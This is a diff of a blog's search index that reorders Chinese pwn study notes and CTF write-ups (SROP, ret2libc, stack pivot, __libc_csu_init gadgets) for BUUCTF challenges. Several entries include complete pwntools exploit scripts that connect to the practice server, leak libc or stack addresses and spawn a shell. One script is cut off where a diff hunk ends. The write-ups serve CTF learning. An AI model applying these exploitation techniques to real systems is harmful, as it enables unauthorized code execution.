@@ -1,6 +1,31 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>SROP</title>
+    <url>/2021/06/28/SROP/</url>
+    <content><![CDATA[<h1 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h1><p>Srop 的全称是Sigreturn Oriented Programming</p>
+<p>Srop 可以理解成一种高级的ROP，利用了linux下15号系统调用的-&gt;rt_sigreturn</p>
+<h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>Signal是Unix系统中的一种通信机制，通常用于在进程之间传递信息，也可以说是软中断信息</p>
+<p>常见于在一个进程中，内核向其发送发送软中断信号，该进程将暂时被挂起，系统进入内核态</p>
+<p>因为是暂时被挂起，所以系统会保留该进程的上下文  (部分内容摘自ctf-wiki)</p>
+<pre><code>将所有的寄存器压入栈中，以及signal信息和指向sigreturn的系统调用地址在栈顶上放置rt_sigreturn
+</code></pre>
+<p>此时栈上的内存分布：<br><img src="/img/14487175105930.png!small.jpg"></p>
+<p>这一段内存也被称为<strong>Signal Frame</strong></p>
+<h2 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h2><pre><code>Signal Frame 被放置在用户进程的内存空间中，也就说Signal Frame是可以读写的
+
+在恢复Signal信号的时候没有检测，也就是说我们可以通过改变Signal Frame中的信息来劫持控制流
+</code></pre>
+<p>例如：<br>  1  | rax = 59//对应59号系统调用-&gt; exceve<br>  2  | rdi = ‘/bin/sh’<br>  3  | rsi = 0<br>  4  | rdx = 0</p>
+<p>这样就能进行一个最简单的Srop</p>
+<h2 id="Srop链"><a href="#Srop链" class="headerlink" title="Srop链"></a>Srop链</h2><p>有时候我们希望执行一系列的操作,此时可以通过syscall ret;这个gadget去串联起我们我们的Srop链</p>
+<p>执行完一个SignalFrame接着执行下一个SignalFrame。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Pwn入门指南</title>
     <url>/2021/10/20/PWN%E2%80%94%E2%80%94%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</url>
     <content><![CDATA[<span id="more"></span>
@@ -119,31 +144,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SROP</title>
-    <url>/2021/06/28/SROP/</url>
-    <content><![CDATA[<h1 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h1><p>Srop 的全称是Sigreturn Oriented Programming</p>
-<p>Srop 可以理解成一种高级的ROP，利用了linux下15号系统调用的-&gt;rt_sigreturn</p>
-<h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>Signal是Unix系统中的一种通信机制，通常用于在进程之间传递信息，也可以说是软中断信息</p>
-<p>常见于在一个进程中，内核向其发送发送软中断信号，该进程将暂时被挂起，系统进入内核态</p>
-<p>因为是暂时被挂起，所以系统会保留该进程的上下文  (部分内容摘自ctf-wiki)</p>
-<pre><code>将所有的寄存器压入栈中，以及signal信息和指向sigreturn的系统调用地址在栈顶上放置rt_sigreturn
-</code></pre>
-<p>此时栈上的内存分布：<br><img src="/img/14487175105930.png!small.jpg"></p>
-<p>这一段内存也被称为<strong>Signal Frame</strong></p>
-<h2 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h2><pre><code>Signal Frame 被放置在用户进程的内存空间中，也就说Signal Frame是可以读写的
-
-在恢复Signal信号的时候没有检测，也就是说我们可以通过改变Signal Frame中的信息来劫持控制流
-</code></pre>
-<p>例如：<br>  1  | rax = 59//对应59号系统调用-&gt; exceve<br>  2  | rdi = ‘/bin/sh’<br>  3  | rsi = 0<br>  4  | rdx = 0</p>
-<p>这样就能进行一个最简单的Srop</p>
-<h2 id="Srop链"><a href="#Srop链" class="headerlink" title="Srop链"></a>Srop链</h2><p>有时候我们希望执行一系列的操作,此时可以通过syscall ret;这个gadget去串联起我们我们的Srop链</p>
-<p>执行完一个SignalFrame接着执行下一个SignalFrame。</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>(HarekazeCTF2019)baby_rop2</title>
     <url>/2021/06/28/HarekazeCTF2019-baby-rop2/</url>
     <content><![CDATA[<h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>检查保护机制，64位，开NX</p>
@@ -180,6 +180,35 @@
 
 <p>最后拿flag时，发现flag还没有放在根目录下，需要find -name “flag”去查找，最后cat flag</p>
 <p><img src="/img/image-20210628210723648.png" alt="image-20210628210723648"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>(OGeek2019)babyrop(ret2libc)</title>
+    <url>/2021/06/20/%5BOGeek2019%5Dbabyrop/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="OGeek2019-babyrop-ret2libc"><a href="#OGeek2019-babyrop-ret2libc" class="headerlink" title="[OGeek2019]babyrop(ret2libc)"></a>[OGeek2019]babyrop(ret2libc)</h1><p>查看保护机制，32位，开了NX</p>
+<p><img src="/img/image-20210504170711043.png" alt="image-20210504170711043"></p>
+<p>IDA打开查看发现有随机数问题</p>
+<p><img src="/img/image-20210504171507650.png" alt="image-20210504171507650"></p>
+<p>通过strncmp函数比较随机数与输入数是否相等</p>
+<p><img src="/img/image-20210504171816124.png" alt="image-20210504171816124"></p>
+<p>这里想到可以通过\x00来绕过strncmp函数，因为strlen遇到\x00会停止</p>
+<p><img src="/img/image-20210504181922297.png" alt="image-20210504181922297"></p>
+<p>因为a1是函数sub_804871F的返回值，那就让a1为 \xff 这样就可以进行栈溢出了 </p>
+<p><img src="/img/image-20210513155325475.png" alt="image-20210513155325475"></p>
+<p>libc.so可以给我们提供一套函数的地址，并且在里面虽有函数的相对位置都是固定的。意思是如果我们知道了每一个函数的真实地址，我们可以根据给出的libc.so计算出其他函数的真实地址(实际上就是要得到system_addr)</p>
+<p>这里选择泄露write_addr，然后计算出system_addr</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.因为给出了libc版本，所以我们可以直接使用<br>2.在这题中，我们可以泄露write函数的地址，然后用题目提供的动态共享库算出内存中system函数的地址<br>3.再用system函数的地址覆盖返回地址</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28990&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">7</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = (<span class="number">0xE7</span> + <span class="number">4</span>) * <span class="string">b&#x27;a&#x27;</span> +  p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x8</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Correct\n&quot;</span>,payload)</span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>).strip().ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;write_addr: &#x27;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;system_addr   &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;binsh_addr   &quot;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">7</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = (<span class="number">0xE7</span> + <span class="number">4</span>)  * <span class="string">b&#x27;a&#x27;</span> +  p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr) </span><br><span class="line">io.sendlineafter(<span class="string">&quot;Correct&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>最后脚本一跑，拿到了flag</p>
+<p><img src="/img/image-20210620200813979.png" alt="image-20210620200813979"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -282,64 +311,6 @@
       </tags>
   </entry>
   <entry>
-    <title>(OGeek2019)babyrop(ret2libc)</title>
-    <url>/2021/06/20/%5BOGeek2019%5Dbabyrop/</url>
-    <content><![CDATA[<span id="more"></span>
-<h1 id="OGeek2019-babyrop-ret2libc"><a href="#OGeek2019-babyrop-ret2libc" class="headerlink" title="[OGeek2019]babyrop(ret2libc)"></a>[OGeek2019]babyrop(ret2libc)</h1><p>查看保护机制，32位，开了NX</p>
-<p><img src="/img/image-20210504170711043.png" alt="image-20210504170711043"></p>
-<p>IDA打开查看发现有随机数问题</p>
-<p><img src="/img/image-20210504171507650.png" alt="image-20210504171507650"></p>
-<p>通过strncmp函数比较随机数与输入数是否相等</p>
-<p><img src="/img/image-20210504171816124.png" alt="image-20210504171816124"></p>
-<p>这里想到可以通过\x00来绕过strncmp函数，因为strlen遇到\x00会停止</p>
-<p><img src="/img/image-20210504181922297.png" alt="image-20210504181922297"></p>
-<p>因为a1是函数sub_804871F的返回值，那就让a1为 \xff 这样就可以进行栈溢出了 </p>
-<p><img src="/img/image-20210513155325475.png" alt="image-20210513155325475"></p>
-<p>libc.so可以给我们提供一套函数的地址，并且在里面虽有函数的相对位置都是固定的。意思是如果我们知道了每一个函数的真实地址，我们可以根据给出的libc.so计算出其他函数的真实地址(实际上就是要得到system_addr)</p>
-<p>这里选择泄露write_addr，然后计算出system_addr</p>
-<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.因为给出了libc版本，所以我们可以直接使用<br>2.在这题中，我们可以泄露write函数的地址，然后用题目提供的动态共享库算出内存中system函数的地址<br>3.再用system函数的地址覆盖返回地址</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28990&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">7</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = (<span class="number">0xE7</span> + <span class="number">4</span>) * <span class="string">b&#x27;a&#x27;</span> +  p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x8</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Correct\n&quot;</span>,payload)</span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>).strip().ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;write_addr: &#x27;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;system_addr   &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;binsh_addr   &quot;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">7</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = (<span class="number">0xE7</span> + <span class="number">4</span>)  * <span class="string">b&#x27;a&#x27;</span> +  p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr) </span><br><span class="line">io.sendlineafter(<span class="string">&quot;Correct&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>最后脚本一跑，拿到了flag</p>
-<p><img src="/img/image-20210620200813979.png" alt="image-20210620200813979"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ciscn_s_3</title>
-    <url>/2021/06/28/ciscn-s-3/</url>
-    <content><![CDATA[<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>检查保护机制，64位，开NX</p>
-<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/image-20210628173000858.png" alt="image-20210628173000858"></h2><p>IDA打开，查看main函数，里面只有一个vuln函数</p>
-<p><img src="/img/image-20210628173110722.png" alt="image-20210628173110722"></p>
-<p>再查看vuln函数，一个sys_read,一个sys_write,写入0x400，读0x30，这里就发现栈溢出的漏洞</p>
-<p><img src="/img/image-20210628173134218.png" alt="image-20210628173134218"></p>
-<p>然后又发现了一个gadget函数</p>
-<p><img src="/img/image-20210628173525340.png" alt="image-20210628173525340"></p>
-<p><img src="/img/image-20210628174307696.png" alt="image-20210628174307696"></p>
-<h3 id="这里要注意："><a href="#这里要注意：" class="headerlink" title="这里要注意："></a>这里要注意：</h3><p>  mov      rax, 15       sys_rt_sigreturn</p>
-<p>  mov      rax, 59       sys_execve</p>
-<p>gadget函数没有被直接调用，该函数设置了rax=15并返回，推测可能和系统调用号有关。查到ubuntu18 64位系统调用号15为<strong>rt_sigreturn</strong>，用于恢复从用户态进入内核态所保存的上下文（即寄存器信息），59为<strong>execve</strong>，作用是执行一个新的程序，程序可以是二进制的可执行程序，也可以是shell、pathon脚本</p>
-<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。</p>
-<p><img src="/img/image-20210628175901200.png" alt="image-20210628175901200"></p>
-<p>r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，所以需要知道栈的地址，我们获取/bin/sh字符串时也需要知道栈地址。这题刚好在write的时候0x28这个位置是栈上的值，于是通过计算可以得到栈上/bin/sh的地址，即rsp-0x10的值。</p>
-<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28640</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">execve=<span class="number">0x04004E2</span></span><br><span class="line">pop_rdi=<span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15=<span class="number">0x40059A</span></span><br><span class="line">mov_rdxr13_call=<span class="number">0x0400580</span> </span><br><span class="line">sys=<span class="number">0x00400517</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">sh=u64(io.recv(<span class="number">8</span>))-<span class="number">280</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload2+=p64(mov_rdxr13_call)+p64(execve)</span><br><span class="line">payload2+=p64(pop_rdi)+p64(sh)+p64(sys)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>cat flag!</p>
-<p><img src="/img/image-20210628181623724.png"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>canary</title>
     <url>/2021/12/20/canary/</url>
     <content><![CDATA[<span id="more"></span>
@@ -367,6 +338,60 @@
 ]]></content>
       <categories>
         <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>blog诞生日2021.6.17</title>
+    <url>/2021/06/17/blog%E8%AF%9E%E7%94%9F%E6%97%A52021-6-17/</url>
+    <content><![CDATA[<span id="more"></span>
+<p>经过一下午不懈的努力，我终于在2021年6月17日下午17：30成功搭建了我的博客，在这发文纪念一下！<br><img src="/img/%E8%AF%9E%E7%94%9F%E6%97%A5.jpg"></p>
+]]></content>
+      <categories>
+        <category>日常闲话</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ciscn_2019_es_2</title>
+    <url>/2021/06/28/ciscn-2019-es-2/</url>
+    <content><![CDATA[<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><p>检查保护机制，32位，开启NX</p>
+<p><img src="/img/image-20210628215206342.png" alt="image-20210628215206342"></p>
+<p>IDA打开，shift+F12查找字符串，发现sysytem函数，但没有/bin/sh，还是无法直接利用</p>
+<p><img src="/img/image-20210628215304461.png" alt="image-20210628215304461"></p>
+<p>找到system函数真实地址0x8048400</p>
+<p><img src="/img/image-20210628215541204.png" alt="image-20210628215541204"></p>
+<p>main函数，还是一样，里面的vlu()函数肯定是重点</p>
+<p><img src="/img/image-20210628215636474.png" alt="image-20210628215636474"></p>
+<p><img src="/img/image-20210628215644207.png" alt="image-20210628215644207"></p>
+<p>读入0x30字节数据给s，s大小是0x28，只能溢出0x8字节，覆盖到ret，没法构造太长的rop，但是这边可以给s写入2次数据。</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>我们可以通过第一次输入来泄露程序里的ebp地址，知道了ebp的地址就能够推算出参数s在栈上的地址，第二次直接往栈上写入system（‘/bin/sh’），之后利用leave；ret的栈劫持去到参数s的栈，让它去执行我们布置在栈上的system（‘/bin/sh’）来获取shell。</p>
+<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>1.泄露ebp</p>
+<p>printf函数在输出时遇到’\0’会停止，若将s填满，这样在末尾就无法加上’\0’，就可以泄露ebp了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">ebp=u32(r.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
+
+<p>2.找到s在栈上的位置</p>
+<p>算出ebp-0x38是参数s在栈上的位置</p>
+<p>3.布置栈上的值</p>
+<p><img src="/img/image-20210628221147958.png" alt="image-20210628221147958"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+p32(s+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>第一个’aaaa‘随便输入，如果一开始将system函数写第一个，那么我们在用leave；ret劫持栈的时候要抬高4字节<br>接着跟上system函数的地址<br>后面是执行完system函数后的返回地址，这边也可以随便写<br>之后是一个地址，这个地址指向的是我们写在栈上的’/bin/sh‘字符串</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2+=p32(s)+p32(leave_ret)</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27757</span>)</span><br><span class="line"></span><br><span class="line">sys=<span class="number">0x8048400</span></span><br><span class="line">leave_ret=<span class="number">0x08048562</span></span><br><span class="line">main=<span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">s=ebp=u32(r.recv(<span class="number">4</span>))-<span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+p32(s+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p32(s)+p32(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.send(payload2)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>cat flag</p>
+<p><img src="/img/image-20210628221613459.png" alt="image-20210628221613459"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
       </categories>
       <tags>
         <tag>pwn</tag>
@@ -463,38 +488,26 @@
       </tags>
   </entry>
   <entry>
-    <title>ciscn_2019_es_2</title>
-    <url>/2021/06/28/ciscn-2019-es-2/</url>
-    <content><![CDATA[<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><p>检查保护机制，32位，开启NX</p>
-<p><img src="/img/image-20210628215206342.png" alt="image-20210628215206342"></p>
-<p>IDA打开，shift+F12查找字符串，发现sysytem函数，但没有/bin/sh，还是无法直接利用</p>
-<p><img src="/img/image-20210628215304461.png" alt="image-20210628215304461"></p>
-<p>找到system函数真实地址0x8048400</p>
-<p><img src="/img/image-20210628215541204.png" alt="image-20210628215541204"></p>
-<p>main函数，还是一样，里面的vlu()函数肯定是重点</p>
-<p><img src="/img/image-20210628215636474.png" alt="image-20210628215636474"></p>
-<p><img src="/img/image-20210628215644207.png" alt="image-20210628215644207"></p>
-<p>读入0x30字节数据给s，s大小是0x28，只能溢出0x8字节，覆盖到ret，没法构造太长的rop，但是这边可以给s写入2次数据。</p>
-<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>我们可以通过第一次输入来泄露程序里的ebp地址，知道了ebp的地址就能够推算出参数s在栈上的地址，第二次直接往栈上写入system（‘/bin/sh’），之后利用leave；ret的栈劫持去到参数s的栈，让它去执行我们布置在栈上的system（‘/bin/sh’）来获取shell。</p>
-<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>1.泄露ebp</p>
-<p>printf函数在输出时遇到’\0’会停止，若将s填满，这样在末尾就无法加上’\0’，就可以泄露ebp了</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">ebp=u32(r.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
+    <title>ciscn_s_3</title>
+    <url>/2021/06/28/ciscn-s-3/</url>
+    <content><![CDATA[<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>检查保护机制，64位，开NX</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/image-20210628173000858.png" alt="image-20210628173000858"></h2><p>IDA打开，查看main函数，里面只有一个vuln函数</p>
+<p><img src="/img/image-20210628173110722.png" alt="image-20210628173110722"></p>
+<p>再查看vuln函数，一个sys_read,一个sys_write,写入0x400，读0x30，这里就发现栈溢出的漏洞</p>
+<p><img src="/img/image-20210628173134218.png" alt="image-20210628173134218"></p>
+<p>然后又发现了一个gadget函数</p>
+<p><img src="/img/image-20210628173525340.png" alt="image-20210628173525340"></p>
+<p><img src="/img/image-20210628174307696.png" alt="image-20210628174307696"></p>
+<h3 id="这里要注意："><a href="#这里要注意：" class="headerlink" title="这里要注意："></a>这里要注意：</h3><p>  mov      rax, 15       sys_rt_sigreturn</p>
+<p>  mov      rax, 59       sys_execve</p>
+<p>gadget函数没有被直接调用，该函数设置了rax=15并返回，推测可能和系统调用号有关。查到ubuntu18 64位系统调用号15为<strong>rt_sigreturn</strong>，用于恢复从用户态进入内核态所保存的上下文（即寄存器信息），59为<strong>execve</strong>，作用是执行一个新的程序，程序可以是二进制的可执行程序，也可以是shell、pathon脚本</p>
+<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。</p>
+<p><img src="/img/image-20210628175901200.png" alt="image-20210628175901200"></p>
+<p>r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，所以需要知道栈的地址，我们获取/bin/sh字符串时也需要知道栈地址。这题刚好在write的时候0x28这个位置是栈上的值，于是通过计算可以得到栈上/bin/sh的地址，即rsp-0x10的值。</p>
+<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28640</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">execve=<span class="number">0x04004E2</span></span><br><span class="line">pop_rdi=<span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15=<span class="number">0x40059A</span></span><br><span class="line">mov_rdxr13_call=<span class="number">0x0400580</span> </span><br><span class="line">sys=<span class="number">0x00400517</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">sh=u64(io.recv(<span class="number">8</span>))-<span class="number">280</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span 